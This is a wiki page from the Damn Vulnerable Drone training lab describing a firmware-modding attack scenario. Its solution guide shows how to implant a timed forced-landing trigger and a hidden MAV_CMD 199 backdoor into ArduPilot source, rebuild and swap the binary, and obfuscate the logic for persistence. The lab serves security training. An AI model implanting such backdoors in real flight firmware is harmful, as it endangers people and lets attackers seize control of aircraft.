<i>Modify ArduPilot firmware to implant persistent backdoors directly into the drone’s flight logic</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Firmware Attacks > Firmware Modding

# Description

In this scenario, you’ll modify the flight controller firmware source code, inject malicious behavior, recompile the firmware, and replace the drone’s binary inside the Damn Vulnerable Drone simulation environment. Unlike protocol spoofing, this technique directly implants malicious logic inside the binary the drone executes.

# Resources

- [Firmware Decompile](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Firmware-Decompile)
- [ArduPilot Source Code](https://github.com/ArduPilot/ardupilot)
- [ArduPilot Dev Guide](https://ardupilot.org/dev/docs/where-to-get-the-code.html)
- [Ghidra](https://ghidra-sre.org/)

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

### Step 1. Decompile and Review the Current Firmware

Follow the [Firmware Decompile](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Firmware-Decompile) scenario to extract and disassemble the drone’s current `arducopter` binary using Ghidra. This allows you to trace execution paths and identify insertion points for code injection.

---

### Step 2. Modify the ArduPilot Firmware Source

On your host machine, clone the ArduPilot repository:

Target a logic control point. Popular candidates include:

- `mode_guided.cpp`
- `mode_auto.cpp`
- `GCS_Mavlink.cpp`
- `commands.cpp`

Example: Inject a malicious LAND trigger after 30 seconds of runtime:

In `mode_guided.cpp`, inside `Guided::run()`:

<pre><code class="code mb-3 mt-3">if (millis() > 30000) {
    gcs().send_text(MAV_SEVERITY_CRITICAL, "Malicious Landing Triggered.");
    set_mode(LAND, MODE_REASON_GCS_COMMAND);
}</code></pre>

Or add a hidden MAV_CMD handler in `GCS_MAVLink.cpp`:

<pre><code class="code mb-3 mt-3">case 199:  // Arbitrary unassigned command
    gcs().send_text(MAV_SEVERITY_NOTICE, "Backdoor command received");
    set_mode(RTL, MODE_REASON_GCS_COMMAND);
    break;</code></pre>

---

### Step 3. Rebuild the Modified Firmware

Still inside the container:

<pre><code class="code mb-3 mt-3">cd /opt/ardupilot
./waf distclean
./waf configure --board sitl
./waf copter</code></pre>

The compiled binary will be available at:

<pre><code class="code mb-3 mt-3">build/sitl/bin/arducopter</code></pre>

---

### Step 4. Replace the DVD Flight Firmware

Copy the modified binary into the DVD flight controller container:

Ensure the launch wrapper in the container references /usr/local/bin/arducopter.

---

### Step 5. Validate the Payload

Re-open DVD using QGroundControl or MAVProxy. You can now test the payload:

- For **automatic behaviors**, wait ~30s after boot and observe if LAND is triggered
- For **custom MAV_CMDs**, run:

<pre><code class="code mb-3 mt-3">mavproxy.py --master=tcp:127.0.0.1:5760
</code></pre>

Then send your injected command:

<pre><code class="code mb-3 mt-3">command long 1 1 199 0 0 0 0 0 0 0</code></pre>

Watch for text responses like:
<pre><code class="code mb-3 mt-3">Backdoor command received</code></pre>

You can observe changes in drone behavior (e.g., RTL, LAND, or armed state toggling).

---

### Step 6. Add Persistence or Evade Detection (Optional)

To persist your payload:

- Rebuild and overwrite the firmware image in the Docker base layer (rebuild the DVD image with `COPY` instruction)
- Obfuscate the logic using random delays, conditional checks, or wrapping inside existing conditions (e.g., `if (g.failsafe == true)`)

</details>
